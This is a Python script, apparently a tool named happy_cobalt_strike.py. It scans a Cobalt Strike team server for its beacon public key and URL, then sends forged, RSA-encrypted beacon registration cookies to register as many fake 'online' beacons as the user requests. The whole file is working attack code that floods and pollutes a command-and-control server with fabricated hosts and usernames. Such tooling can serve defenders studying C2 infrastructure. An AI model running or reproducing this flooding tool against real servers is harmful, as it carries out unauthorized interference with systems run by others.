#!/usr/bin/env python3
# -*- coding:utf-8 -*-
#__author__ = "Done"

import requests
import rsa
import time
import random
import string
import binascii
import base64
import scan
import argparse

username_list = ['jhong', 'caini', 'hello', 'admin',\
            'silly', 'hack0',"shazi","feiwu"]

os_version_list = ["Windows10 Premium","Server 2012 R2 ","Windows xp home",\
        "Windwos7 Pro   ","Win7 Enterprise"]

def str2hex(a_str):

    s_hex = ""
    for i in range(len(a_str)):
        s_hex = s_hex+hex(ord(a_str[i]))[2:]+" "
    return s_hex

def pub_encode(pub_rsa_key):

    #make fake message
    computer_name = random.choice(os_version_list)[0:15]
    com_name = str2hex(computer_name).replace(" ","")
    internal_ip = str2hex(str(random.randint(100,255))).replace(" ","")+"2E"+str2hex(str(random.randint(100,255))).replace(" ","")
    username = str2hex(random.choice(username_list)[0:5]).replace(" ","")
    beacon_id = ''.join(random.sample(string.digits, 2))
    beacon_id_hex = str2hex(beacon_id).replace(" ","")
    pid = str(hex(random.randint(4096,9999)))[2:]

    y = "0000BEEF00000056D48A3A7104FC17544D5A3752C6EEAED4E404B5015F"\
        +beacon_id_hex+"800000"+pid+"00000431302E30093139322E3136382E"+internal_ip\
        +"09"+com_name+"09"+username+"0972756E646C6C33322E657865"
    
    bb = trans_rsa_pub_key(pub_rsa_key)
    pub_key = b'-----BEGIN PUBLIC KEY-----\n'+bb+b'\n-----END PUBLIC KEY-----'
    f = rsa.PublicKey.load_pkcs1_openssl_pem(pub_key) 
    cipher_text = rsa.encrypt(binascii.unhexlify(y), f) 

    return base64.b64encode(cipher_text)

def send_cookies(pub_rsa_key,get_url,beacon_port,beacon_ssl):

    header={
        "Accept": "*/*",
        "Cookie": "",
        "User-Agent": "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; MAGWJS)",
        "Host": "127.0.0.1",
        "Connection": "Keep-Alive",
        "Cache-Control": "no-cache"
    }

    header["Cookie"] = pub_encode(pub_rsa_key)
    header["Host"] = get_url.split(",")[0]
    print(header["Cookie"])

    if beacon_ssl==False:
        cs_url = "http://"+header["Host"]+":"+str(beacon_port)+get_url.split(",")[1]
        s = requests.get(cs_url,headers=header)
    else:
        cs_url = "https://"+header["Host"]+":"+str(beacon_port)+get_url.split(",")[1]
        print(cs_url)
        s = requests.get(cs_url,headers=header,verify=False)

def trans_rsa_pub_key(pub_rsa_key):
    pub_key_base64=base64.b64encode(pub_rsa_key)
    return pub_key_base64


if __name__ == "__main__":
    
    print("6f144d392c1a418070d45381b11ef86d")
    parser = argparse.ArgumentParser(description="python3 happy_cobalt_strike.py 127.0.0.1 50 ")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("scan", nargs='?', help="Enter an IP/Domain to scan.")
    parser.add_argument("count", nargs='?', help="Mode: Number of attacks，50 means online 50 beacon", type=int)

    args = parser.parse_args()

    if not args.scan:
        parser.error("A domain/IP to scan or an input file is required.")
    pub_key_bytes,get_url,beacon_port,beacon_ssl=scan.scan_beacon(args.scan)
    print(beacon_port,beacon_ssl,get_url)
    num=args.count
    count=0
    while count<num:
        send_cookies(pub_key_bytes,get_url,beacon_port,beacon_ssl)
        count=count+1
